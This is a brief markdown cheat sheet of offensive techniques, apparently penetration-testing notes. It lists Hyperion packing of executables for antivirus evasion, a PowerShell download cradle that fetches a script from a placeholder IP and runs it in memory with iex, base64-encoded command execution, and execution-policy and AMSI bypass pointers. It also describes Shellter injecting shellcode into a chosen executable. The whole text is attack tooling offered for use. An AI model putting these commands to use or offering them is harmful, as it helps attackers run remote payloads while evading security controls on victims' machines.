# [hyperion](https://web.archive.org/web/20191116023532/https://nullsecurity.net/tools/binary.html):
#### `wine hyperion.exe <file> <output_file>`
  *  packs the executable for av evasion and anti-reverse-engineering

# [powershell](https://docs.microsoft.com/en-us/powershell/):
#### `powershell.exe iex (New-Object System.Net.WebClient).DownloadString('http://X.X.X.X/file.ps1')`
#### `type .\file.ps1 | powershell.exe -nop -`
#### `powershell.exe -Enc YmFzZTY0IGVuY29kZWQgc2NyaXB0`
#### `GC .\file.ps1 | iex`
#### `Set-ExecutionPolicy Bypass -Scope Process`
  * [this site might help](https://amsi.fail/) / [archived](https://web.archive.org/web/20210801035721/https://amsi.fail/)
  * iex runs it in memory instead of saving to disk
  * -ExecutionPolicy Bypass gets around some powershell restrictions
  * -Enc is short for EncodedCommand can run base64 encoded scripts / text
  * GC is short for Get-Content and can bypass some restrictions
  * Set-ExecutionPolicy is a temporary bypass for some restrictions
  
# [shellter](https://www.shellterproject.com/introducing-shellter/):
#### `choose a target to inject shellcode into`
#### `can do "stealth mode" which attempts to restore execution of target executable after shellcode`